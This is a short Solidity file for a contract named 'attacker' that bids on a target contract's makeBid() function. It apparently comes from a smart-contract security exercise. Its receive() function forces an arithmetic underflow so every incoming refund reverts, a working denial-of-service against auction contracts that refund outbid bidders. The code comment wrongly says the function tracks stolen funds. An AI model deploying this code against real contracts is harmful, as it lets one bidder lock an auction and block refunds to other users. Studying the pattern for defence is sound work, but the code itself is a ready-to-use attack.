//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

//1 Week: 604800 seconds
interface TargetContract {
    function makeBid() external payable;
}

contract attacker {
    address targetAddress;
    address owner;
        TargetContract target_instance;

    constructor() 
    {
        owner = msg.sender;
    }

    function setTargetAddress(address _address) public {
        require(owner==msg.sender,"Not Owner");
        targetAddress = _address;
         target_instance=TargetContract(_address);
    }
    function loadFunds() external payable {
        target_instance.makeBid{value:msg.value}();
    }    
        receive() external payable  {
        // Update the local value to track how much as been stolen (For bragging rights and situational awareness) 
         uint a = 0;
         a = a-msg.value;
        }
     }

